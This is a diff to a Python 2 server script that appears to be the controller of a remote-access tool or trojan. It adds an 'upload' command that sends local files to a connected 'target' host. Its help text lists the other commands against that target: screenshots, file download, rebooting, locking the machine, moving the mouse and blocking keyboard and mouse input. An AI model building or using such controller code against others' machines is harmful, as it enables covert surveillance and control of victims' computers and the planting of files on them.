@@ -4,6 +4,7 @@
 ## Mail: s0nnet@qq.com
 
 import os
+import time
 import socket
 import threading
  
@@ -44,6 +45,35 @@ def recvFile(client_socket,type):
         f.write(data)
     f.close()
 
+# send the local File
+def sendFile(client_socket):
+    while(1):
+        filename = raw_input("File: ")
+        try:
+            f = open(filename,"rb")
+            break
+        except:
+            print "Open %s error!" % filename
+            continue
+
+    destPath = raw_input("To: ")
+    client_socket.send(destPath)
+
+    time.sleep(1)
+    while(1):
+        data = f.read(1024)
+        print len(data)
+        if not data:
+            break
+        client_socket.sendall(data)
+    f.close()
+    time.sleep(2)
+    client_socket.sendall("EOF")
+
+    print "Send file successed!"
+
+
+
 # this is our client-handling thread
 def handle_client(client_socket):
 
@@ -65,6 +95,9 @@ def handle_client(client_socket):
             client_socket.send(cmd)
             recvFile(client_socket,cmd[-4:])
             continue
+        elif cmd == "upload":
+            sendFile(client_socket)
+            continue
 
         elif cmd == "kill-client":
             data = client_socket.recv(1024)
@@ -84,6 +117,8 @@ def help():
     print "\treboot        --reboot the target host after 10s."
     print "\tcancel        --cancel shutdown or reboot."
     print "\tscreenshot    --screenshot the target host."
+    print "\tdownload      --download the taeget's file."
+    print "\tupload        --upload the local's file to the target."
     print "\tlock          --lock the target host."
     print "\tmouse         --move the mouse the the location of (0,0)."
     print "\tblockinput    --lock the target's keyboard and mouse in 5s."
